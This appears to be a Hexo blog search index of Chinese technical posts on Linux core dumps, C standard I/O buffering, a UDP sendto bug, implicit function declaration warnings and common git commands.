<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Linux下生成core dump文件</title>
    <url>/2020/02/28/2020-02-28-how-to-generate-core-dump-file/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>Linux上运行C程序发生段错误后，没有core文件生成，调试不便。</p>
<span id="more"></span>

<h2 id="生成core文件步骤"><a href="#生成core文件步骤" class="headerlink" title="生成core文件步骤"></a>生成core文件步骤</h2><ol>
<li>敲ulimit -a，查看系统core文件大小限制，如第一行core file size值为0，表示没打开core文件设置<br><img src="/2020/02/28/2020-02-28-how-to-generate-core-dump-file/image1.png"></li>
<li>敲ulimit -c [kbytes], 设置系统允许生成的core文件大小, 如： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ulimit -c 1024        设置core文件最大为1024K</span><br><span class="line">ulimit -c unlimited   不限制core文件大小</span><br><span class="line">ulimit -c 0           不生成core文件</span><br></pre></td></tr></table></figure></li>
<li>运行C程序，段错误后，在当前目录生成core文件。<br><img src="/2020/02/28/2020-02-28-how-to-generate-core-dump-file/image2.png"></li>
</ol>
<p><strong>问题:</strong><br>多次运行程序发生段错误后，新生成的core文件会把旧的core文件覆盖，怎么区分并保留多个core文件?</p>
<p><strong>解决方法:</strong><br>敲 echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;core_uses_pid, 将每次产生的core文件的文件名中是否添加pid作为扩展。如果添加则文件内容为1，反之为0。<br><img src="/2020/02/28/2020-02-28-how-to-generate-core-dump-file/image3.png"><br>如上图，两次coredump后，会根据pid生成不同的core文件。</p>
<p><strong>指定core文件的输出格式和路径</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo /path/to/core.%t.%e.%p &gt; /proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>标准IO库的缓冲模式</title>
    <url>/2020/03/22/2020-03-22-buffered-mode-of-standard-IO-lib/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>有时候，代码中明明执行了printf语句打印到终端，却没有看到输出的内容。</p>
<p>写文件的时候，明明成功执行了fwrite, fprintf语句，文件却没有写入相应的内容。</p>
<p>想搞清楚这些问题产生的原因，需要了解标准I&#x2F;O库的缓冲模式。</p>
<span id="more"></span>

<h2 id="标准I-O与unbuffered-I-O"><a href="#标准I-O与unbuffered-I-O" class="headerlink" title="标准I&#x2F;O与unbuffered I&#x2F;O"></a>标准I&#x2F;O与unbuffered I&#x2F;O</h2><p>linux对I&#x2F;O文件操作分为不带缓存I&#x2F;O(unbuffered I&#x2F;O)和带缓存I&#x2F;O(即标准I&#x2F;O)</p>
<p>《APUE》中对术语unbuffered的定义: “The term <em>unbuffered</em> means that each read or write invokes a system call in the kernel”</p>
<p><a href="https://blog.csdn.net/qq_33366098/article/details/77923722">这篇文章</a>讲了unbuffered I&#x2F;O和标准I&#x2F;O的区别，以下引用其中的描述：</p>
<p>不带缓存I&#x2F;O，是指每次read, write都会进入内核，执行一次系统调用，不带缓存不是指直接对磁盘进行读写。比如read,write函数，它们属于系统调用，在用户态没有缓存，但是在内核是有缓存器的。如内核缓存未满，写入的数据还是在内核缓存，并没有真正写入硬盘。需要等待缓存写满或者内核需要重用该缓存以存放其他磁盘块数据时，才进行实际硬盘读写，这种方式被称为延迟写(delayed write)</p>
<p>带缓存I&#x2F;O也叫标准I&#x2F;O。标准I&#x2F;O会在用户态建立一个缓存区，以尽可能减少read和write调用的次数，提高效率。</p>
<p>unbuffered I&#x2F;O操作数据流向：数据-&gt;内核缓存区-&gt;磁盘</p>
<p>标准I&#x2F;O操作数据流向：数据-&gt;流缓存区-&gt;内核缓存区-&gt;磁盘</p>
<h2 id="缓冲"><a href="#缓冲" class="headerlink" title="缓冲"></a>缓冲</h2><p>标准I&#x2F;O库提供三种模式的缓冲: 全缓冲、行缓冲、不带缓冲</p>
<h3 id="全缓冲-fully-buffered"><a href="#全缓冲-fully-buffered" class="headerlink" title="全缓冲(fully buffered)"></a>全缓冲(fully buffered)</h3><p>这种情况下，在填满标准I&#x2F;O缓冲区后才进行实际I&#x2F;O操作。对于驻留在磁盘上的文件通常用全缓冲。</p>
<h3 id="行缓冲-line-buffered"><a href="#行缓冲-line-buffered" class="headerlink" title="行缓冲(line buffered)"></a>行缓冲(line buffered)</h3><p>这种情况下，当输入或输出遇到换行符，或者缓冲区已满时进行实际I&#x2F;O操作。当流涉及一个终端时，通常使用行缓冲。</p>
<h3 id="不带缓冲-unbuffered"><a href="#不带缓冲-unbuffered" class="headerlink" title="不带缓冲(unbuffered)"></a>不带缓冲(unbuffered)</h3><p>这种情况下，标准I&#x2F;O库不对字符进行缓冲存储。例如标准出错流stderr通常是不带缓冲的，这使得出错信息可以尽快显示。</p>
<h3 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h3><p>1.这里的实际I&#x2F;O操作不是指读写硬盘操作，而是指执行read, write系统调用。</p>
<p>2.缓冲类型与具体的标准I&#x2F;O函数无关，与读写的文件类型有关。</p>
<h2 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h2><h3 id="例1-全缓冲"><a href="#例1-全缓冲" class="headerlink" title="例1 全缓冲"></a>例1 全缓冲</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">	char str[] = &quot;hello world&quot;;</span><br><span class="line">	FILE *fp = fopen(&quot;./text&quot;, &quot;w+&quot;);	// 省略了判空操作^_^</span><br><span class="line">	fprintf(fp, &quot;%s\n&quot;, str);</span><br><span class="line">    // fflush(fp);</span><br><span class="line">	for( ; ; ) &#123;</span><br><span class="line">		sleep(10);</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译并运行程序，进入死循环后，观察text文件发现内容为空，hello world字符串并没有写入。</p>
<p>这是因为对于磁盘上的文件默认是全缓冲的。因为写入的字符串长度小于缓冲区大小(我的ubuntu机器上，为4096字节)，所以不会直接写入文件。</p>
<p>如需要立即输出，可以在for循环之前调用fflush函数，将缓冲区的内容写入磁盘。</p>
<p>这解释了为什么有时明明成功执行了fwrite,fprintf语句，文件却没有写入相应的内容。</p>
<h3 id="例2-行缓冲"><a href="#例2-行缓冲" class="headerlink" title="例2 行缓冲"></a>例2 行缓冲</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">	fprintf(stdout, &quot;hello world&quot;);</span><br><span class="line">	for( ; ; ) &#123;</span><br><span class="line">		sleep(10);</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译并运行程序，发现终端没有输出，即使fprintf已经执行。</p>
<p>这是因为涉及终端的流默认是行缓冲的，当输入或输出遇到换行符时才进行实际I&#x2F;O操作。</p>
<p>如果需要执行fprintf后立即打印，只需在”hello world”后添加换行符’\n’</p>
<p>这个例子解释了为什么有时代码中执行了printf语句打印到终端，却没有看到输出的内容。</p>
<h3 id="例3-无缓冲"><a href="#例3-无缓冲" class="headerlink" title="例3 无缓冲"></a>例3 无缓冲</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">int main() &#123;</span><br><span class="line">	fprintf(stderr, &quot;hello world&quot;);</span><br><span class="line">	for( ; ; ) &#123;</span><br><span class="line">		sleep(10);</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译并运行程序,  终端立即输出hello world。可以看出标准错误是不带缓冲的。目的是使出错信息可以尽快显示。</p>
<h3 id="例4-缓冲类型与读写的文件类型有关"><a href="#例4-缓冲类型与读写的文件类型有关" class="headerlink" title="例4 缓冲类型与读写的文件类型有关"></a>例4 缓冲类型与读写的文件类型有关</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">#include&lt;sys/wait.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	pid_t pid;</span><br><span class="line">	printf(&quot;before fork\n&quot;);</span><br><span class="line"></span><br><span class="line">	if((pid = fork()) &lt; 0) &#123;	// fork失败直接返回-1</span><br><span class="line">		exit(-1);</span><br><span class="line">	&#125; else if(pid &gt; 0) &#123;		// 父进程</span><br><span class="line">		wait(NULL);</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;pid = %d, hello\n&quot;, getpid());</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译并执行程序, 得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ./a.out</span><br><span class="line">before fork</span><br><span class="line">pid = 6033, hello</span><br><span class="line">pid = 6032, hello</span><br><span class="line">$ ./a.out &gt; output.txt		#将输出重定向到output.txt文件</span><br><span class="line">$ cat output.txt</span><br><span class="line">before fork</span><br><span class="line">pid = 6077, hello</span><br><span class="line">before fork</span><br><span class="line">pid = 6076, hello</span><br></pre></td></tr></table></figure>

<p>发现两次输出的内容不同，将输出重定向到文件时，会多打印一行”before fork”，原因如下：</p>
<p><strong>如果标准输出连到终端设备，默认是行缓冲的</strong>。”before fork”只输出一次，原因是调用第一个printf后，标准输出缓冲区由换行符冲洗，“before fork”被立即打印。</p>
<p><strong>如果将标准输出重定向到文件，默认是全缓冲的</strong>。”befork fork”会输出两次，原因是调用第一个printf后数据“before fork”仍旧在缓冲区，然后调用fork函数，将父进程数据空间复制到子进程，此时该缓冲区也被复制到子进程。最后当父子进程终止时，各自冲洗其缓冲区的副本。</p>
<p>这个例子说明，缓冲类型与读写的文件类型有关，与具体I&#x2F;O函数无关。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>【1】<a href="https://blog.csdn.net/qq_33366098/article/details/77923722">https://blog.csdn.net/qq_33366098&#x2F;article&#x2F;details&#x2F;77923722</a><br>【2】<a href="https://www.yanbinghu.com/2019/12/01/27836.html">https://www.yanbinghu.com/2019/12/01/27836.html</a></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次UDP sendto函数错误解决</title>
    <url>/2020/03/29/2020-03-29-solve-sendto-error/</url>
    <content><![CDATA[<h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>在编写使用select函数的TCP和UDP回射程序，出现UDP的sendto错误，现象如下：</p>
<ul>
<li><p>服务端正常启动后，调用select函数监听TCP和UDP套接字, 可以正常处理TCP请求。</p>
</li>
<li><p>UDP客户端可以连接到服务端，但接收标准输入后无回显，阻塞于recvfrom。</p>
</li>
</ul>
<span id="more"></span>

<h3 id="解决过程"><a href="#解决过程" class="headerlink" title="解决过程"></a>解决过程</h3><p>经排查，发现服务端处理UDP请求的代码有问题，如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">SA</span>;</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">udp_echo</span><span class="params">(<span class="type">int</span> udpfd)</span> &#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="type">char</span> recvline[MAXLINE];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">cliaddr</span>;</span></span><br><span class="line">	<span class="type">socklen_t</span> len;</span><br><span class="line">	n = recvfrom(udpfd, recvline, MAXLINE, <span class="number">0</span>, (SA*)&amp;cliaddr, &amp;len);</span><br><span class="line">	sendto(udpfd, recvline, n, <span class="number">0</span>, (SA*)&amp;cliaddr, len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>udp_echo函数，先用recvfrom读取UDP客户端发送的字符串，再使用sendto将该字符串送回客户端。代码中没有判断recvfrom, sendto函数的返回值，为了获取出错信息改写如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">udp_echo</span><span class="params">(<span class="type">int</span> udpfd)</span> &#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="type">char</span> recvline[MAXLINE];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">cliaddr</span>;</span></span><br><span class="line">	<span class="type">socklen_t</span> len;</span><br><span class="line">	<span class="keyword">if</span>((n = recvfrom(udpfd, recvline, MAXLINE, <span class="number">0</span>, (SA*)&amp;cliaddr, &amp;len)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		err_sys(<span class="string">&quot;recvfrom error&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(sendto(udpfd, recvline, n, <span class="number">0</span>, (SA*)&amp;cliaddr, len) != n) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;error: %s\n&quot;</span>, strerror(errno));</span><br><span class="line">		err_sys(<span class="string">&quot;sendto error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再运行程序，输出如下:<br>$ error: Invalid argument<br>$ sendto error</p>
<p>错误原因在于cliaddr参数没有初始化。<strong>sockaddr_in结构体在使用之前，需要先使用bzero&#x2F;memset函数初始化为0</strong>，否则出现赋值不完整导致参数无效。</p>
<h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><ul>
<li><p>变量使用之前最好初始化。</p>
</li>
<li><p>注意判断函数的返回值，可以使用包裹函数。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>troubleshooting</category>
      </categories>
      <tags>
        <tag>troubleshooting</tag>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>隐式函数声明[-Wimplicit-function-declaration]</title>
    <url>/2020/04/11/2020-04-11-what-is-implicit-function-declaration/</url>
    <content><![CDATA[<h2 id="什么是隐式函数声明"><a href="#什么是隐式函数声明" class="headerlink" title="什么是隐式函数声明"></a>什么是隐式函数声明</h2><p>C语言中，函数调用前不一定要声明。如果没有声明，编译器会自动按照一种隐式声明规则，为调用函数的C代码产生汇编代码。</p>
<span id="more"></span>

<h2 id="忽略隐式函数声明警告的危害"><a href="#忽略隐式函数声明警告的危害" class="headerlink" title="忽略隐式函数声明警告的危害"></a>忽略隐式函数声明警告的危害</h2><p>编译so库时会出现未定义符号，导致加载该so的程序执行出错。举例如下:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// add.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c)</span> &#123; <span class="comment">// 调用add方法，求三数和</span></span><br><span class="line">	retunr <span class="title function_">ad</span><span class="params">(a, b)</span> + c; <span class="comment">// 这里本意调用add(a, b)，笔误写成ad(a, b)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将add.c编译成libadd.so，编译不报错，仅提示隐式函数声明警告，用ldd -r查看该so, 发现未定义符号ad。<br><img src="/2020/04/11/2020-04-11-what-is-implicit-function-declaration/image1.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ ldd -r libadd.so</span><br><span class="line">undefined symbol: ad (./libadd.so)</span><br></pre></td></tr></table></figure>

<p>此时写一个main程序，调用libadd.so中的sum方法求三数之和</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">sum</span><span class="params">(<span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, sum(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译main程序出错，错误原因在于<strong>编写add.c时将符号add错写成了ad，由于忽视隐式函数声明警告，导致该错误没有在编译add.c的时候及时发现。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ gcc main.c -L. -ladd</span><br><span class="line">./libadd.so: undefined reference to `ad&#x27;</span><br><span class="line">collect2: error: ld returned 1 exit status</span><br></pre></td></tr></table></figure>

<ul>
<li>对于用dlopen动态加载该so库的程序，如指定RTLD_NOW，dlopen立即失败；如指定RTLD_LAZY延迟绑定，则dlopen成功，但dlsym加载引用了未定义符号的函数(如sum函数)会出错，示例main程序如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">void</span> *handle = dlopen(<span class="string">&quot;./libadd.so&quot;</span>, RTLD_LAZY);</span><br><span class="line">	<span class="keyword">if</span>(handle == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;%s\n&quot;</span>, dlerror());</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> (*add)(<span class="type">int</span>, <span class="type">int</span>);</span><br><span class="line">	<span class="type">int</span> (*sum)(<span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>);</span><br><span class="line"></span><br><span class="line">	add = dlsym(handle, <span class="string">&quot;add&quot;</span>);	<span class="comment">// add方法正常执行</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1 + 2 = %d\n&quot;</span>, add(<span class="number">1</span>, <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">	sum = dlsym(handle, <span class="string">&quot;sum&quot;</span>);	<span class="comment">// 出错，报未定义符号ad</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1 + 2 + 3 = %d\n&quot;</span>, sum(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>));</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ gcc main.c -ldl</span><br><span class="line">$ ./a.out</span><br><span class="line">1 + 2 = 3</span><br><span class="line">./a.out: symbol lookup error: ./libadd.so: undefined symbol: ad</span><br></pre></td></tr></table></figure>
<p>虽然编译成功，libadd.so可以加载，add函数可以执行，但执行sum函数时报未定义符号错。如及时处理隐式函数声明警告，可以在编译add.c的时候就发现该问题。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li><p>函数先声明再使用，包含必要的头文件。</p>
</li>
<li><p>重视编译器的隐式函数声明警告, 可开启-Werror选项检查, 不要简单使用-Wno忽略该编译告警。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>Git常用命令</title>
    <url>/2020/05/02/2020-05-02-git-basics-and-commands/</url>
    <content><![CDATA[<h3 id="0-git帮助"><a href="#0-git帮助" class="headerlink" title="0. git帮助"></a>0. git帮助</h3><ul>
<li><p>git help命令</p>
</li>
<li><p>git原理和命令可参考《Pro Git》，中文版链接:<a href="https://www.progit.cn"> https://www.progit.cn</a></p>
</li>
</ul>
<span id="more"></span>

<h3 id="1-git配置"><a href="#1-git配置" class="headerlink" title="1. git配置"></a>1. git配置</h3><p>通过git config命令配置。–global选项指定读写的配置文件路径为~&#x2F;.gitconfig，只针对当前用户。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git config --global user.name  &quot;user&quot; 		  #设置用户名</span><br><span class="line">git config --global user.email &quot;user@163.com&quot; #设置邮箱</span><br><span class="line">git config --global core.editor emacs 		  #设置默认文本编译器为emacs</span><br><span class="line">git config --list 							  #检查所有git配置</span><br><span class="line">git config &lt;key&gt; 							  #检查git某一项配置，如user.name</span><br></pre></td></tr></table></figure>

<h4 id="忽略文件-——-gitignore"><a href="#忽略文件-——-gitignore" class="headerlink" title="忽略文件 —— .gitignore"></a>忽略文件 —— .gitignore</h4><ul>
<li><p>.gitginore文件作用: 忽略无需纳入git管理的文件。</p>
</li>
<li><p>各种语言的.gitignore写法可参考: <a href="https://github.com/github/gitignore">https://github.com/github/gitignore</a></p>
</li>
</ul>
<h3 id="2-获取与创建git仓"><a href="#2-获取与创建git仓" class="headerlink" title="2. 获取与创建git仓"></a>2. 获取与创建git仓</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git init        		#将当前目录初始化为git仓</span><br><span class="line">git clone [url]  		#克隆现有仓库</span><br></pre></td></tr></table></figure>

<h3 id="3-添加-删除文件"><a href="#3-添加-删除文件" class="headerlink" title="3. 添加&#x2F;删除文件"></a>3. 添加&#x2F;删除文件</h3><h4 id="跟踪文件"><a href="#跟踪文件" class="headerlink" title="跟踪文件"></a>跟踪文件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git add &lt;file&gt;	 		#跟踪某个新文件，将内容从工作目录添加到暂存区</span><br><span class="line">git add .		 		#跟踪所有新文件</span><br></pre></td></tr></table></figure>

<h4 id="移除文件"><a href="#移除文件" class="headerlink" title="移除文件"></a>移除文件</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git rm    				#从git中移除文件，并连带从工作目录中删除指定文件</span><br><span class="line">git rm -f 				#如删除之前有修改并已放到暂存区，必须指定-f选项，防止误删还没有添加到快照的数据不能被git恢复</span><br><span class="line">git rm --cached         #把文件从git暂存区删除，但在工作目录保留该文件</span><br><span class="line">git mv &lt;file1&gt; &lt;file2&gt;  #移动文件，相当于执行以下三条命令</span><br><span class="line">					    #mv file1 file2, git rm file1, git add file2</span><br></pre></td></tr></table></figure>

<h4 id="提交更新"><a href="#提交更新" class="headerlink" title="提交更新"></a>提交更新</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git commit       		#提交更新</span><br></pre></td></tr></table></figure>

<h3 id="4-查看信息"><a href="#4-查看信息" class="headerlink" title="4. 查看信息"></a>4. 查看信息</h3><h4 id="查看当前文件状态"><a href="#查看当前文件状态" class="headerlink" title="查看当前文件状态"></a>查看当前文件状态</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git status       		#检查当前文件状态</span><br></pre></td></tr></table></figure>

<h4 id="查看提交历史"><a href="#查看提交历史" class="headerlink" title="查看提交历史"></a>查看提交历史</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git log --pretty=oneline #将每个提交放在一行显示</span><br><span class="line">git log -p -2 			 #-p用来显示每次提交的内容差异, -2表示显示最近两次提交</span><br><span class="line">git log --stat 			 #查看每次提交的简略信息</span><br><span class="line">git reflog				 #显示最近的提交记录</span><br></pre></td></tr></table></figure>

<h4 id="查看修改和差异"><a href="#查看修改和差异" class="headerlink" title="查看修改和差异"></a>查看修改和差异</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git diff 						 #比较工作目录中当前文件和暂存区快照之间差异，即修改后未暂存的变化</span><br><span class="line">git diff --cached [file] 		 #查看暂存区与上一个commit的差异</span><br><span class="line">git diff --staged [file]		 #等同于--cached</span><br><span class="line">git diff HEAD					 #显示工作区与当前分支最新commit的差异</span><br><span class="line">git diff [commitID1] [commitID2] #比较两次提交记录的差异，比如HEAD和HEAD~1</span><br></pre></td></tr></table></figure>

<h3 id="5-分支"><a href="#5-分支" class="headerlink" title="5. 分支"></a>5. 分支</h3><h4 id="查看分支"><a href="#查看分支" class="headerlink" title="查看分支"></a>查看分支</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git branch								 #列出所有本地分支</span><br><span class="line">git branch -a							 #列出所有本地分支和远程分支</span><br></pre></td></tr></table></figure>

<h4 id="新建分支"><a href="#新建分支" class="headerlink" title="新建分支"></a>新建分支</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git branch [branch_name]				 #创建新分支，但仍然停留在当前分支</span><br><span class="line">git branch [branch_name] [commitID]		 #创建新分支，并指向指定commit</span><br><span class="line">git checkout -b [branch_name] [tag_name] #在特定标签上创建一个分支</span><br></pre></td></tr></table></figure>

<h4 id="切换分支"><a href="#切换分支" class="headerlink" title="切换分支"></a>切换分支</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git checkout [branch_name] 				 #切换分支</span><br><span class="line">git checkout -b [branch_name]			 #创建并切换分支</span><br></pre></td></tr></table></figure>

<h4 id="删除分支"><a href="#删除分支" class="headerlink" title="删除分支"></a>删除分支</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git branch -d [branch_name]				 #删除分支</span><br><span class="line">git branch -D [branch_name]				 #强制删除分支</span><br></pre></td></tr></table></figure>

<h4 id="合并分支"><a href="#合并分支" class="headerlink" title="合并分支"></a>合并分支</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git merge  [branch]			   #将branch分支内容合并到当前分支</span><br><span class="line">git rebase [branch]			   #将branch分支内容变基到当前分支</span><br><span class="line">git rebase [branch1] [branch2] #将branch2分支变基到目标分支branch1，省去切换分支的步骤</span><br></pre></td></tr></table></figure>

<h5 id="merge和rebase的区别"><a href="#merge和rebase的区别" class="headerlink" title="merge和rebase的区别"></a>merge和rebase的区别</h5><ul>
<li>merge —— 把两个分支的最新快照及二者最近的共同祖先进行三方合并。</li>
<li>rebase —— 变基，将提交到某一个分支所有修改移到另一个分支。</li>
</ul>
<p><font color ='red'><strong>注：只对从未推送至公共仓库的提交执行变基命令</strong></font>，只把变基命令用作推送前清理提交使之整洁的工具。</p>
<h3 id="6-撤销、清理、重写"><a href="#6-撤销、清理、重写" class="headerlink" title="6. 撤销、清理、重写"></a>6. 撤销、清理、重写</h3><h4 id="撤销操作"><a href="#撤销操作" class="headerlink" title="撤销操作"></a>撤销操作</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git reset HEAD &lt;file&gt; 	 		#取消暂存的文件</span><br><span class="line">git checkout -- &lt;file&gt;   		#撤销文件修改，将文件还原成上次提交的状态</span><br><span class="line">git reset --hard &lt;commitID&gt;		#回退到具体版本号</span><br></pre></td></tr></table></figure>

<h4 id="清理工作目录"><a href="#清理工作目录" class="headerlink" title="清理工作目录"></a>清理工作目录</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clean -df 				# 移除工作目录中没有忽略的未追踪文件及空的子目录, -d表示删除,-f表示强制</span><br><span class="line">git clean -dn 				# -n查看将会删除哪些文件,不会真正删除</span><br><span class="line">git clean -xdf 	   			# 指定-x额外移除已忽略的未追踪文件</span><br></pre></td></tr></table></figure>

<h4 id="重写历史"><a href="#重写历史" class="headerlink" title="重写历史"></a>重写历史</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git commit --amend  		#修改最后一次提交</span><br><span class="line">git rebase -i [commitID]    #修改多个历史提交</span><br></pre></td></tr></table></figure>

<h3 id="7-项目共享与更新"><a href="#7-项目共享与更新" class="headerlink" title="7. 项目共享与更新"></a>7. 项目共享与更新</h3><h4 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git remote -v 					 #查看远程仓库</span><br><span class="line">git remote add &lt;shortname&gt; &lt;url&gt; #添加新的远程git仓库</span><br><span class="line">git remote rm &lt;shortname&gt;        #移除远程仓库</span><br></pre></td></tr></table></figure>

<h4 id="抓取、推送"><a href="#抓取、推送" class="headerlink" title="抓取、推送"></a>抓取、推送</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git fetch [remote] 		 		    #拉取远程仓库数据到本地，但不会自动合并</span><br><span class="line">git pull [remote] [branch]		    #相当于git fetch和git merge命令的组合</span><br><span class="line">git push [remote] [branch]		    #推送本地分支到远程, -f强制推送</span><br><span class="line">git push [remote] –-delete [branch] #删除远程分支</span><br></pre></td></tr></table></figure>

<h3 id="8-git设置别名"><a href="#8-git设置别名" class="headerlink" title="8. git设置别名"></a>8. git设置别名</h3><p>通过git config为git命令创建别名后，无需每次输入完整的git命令，简化了操作</p>
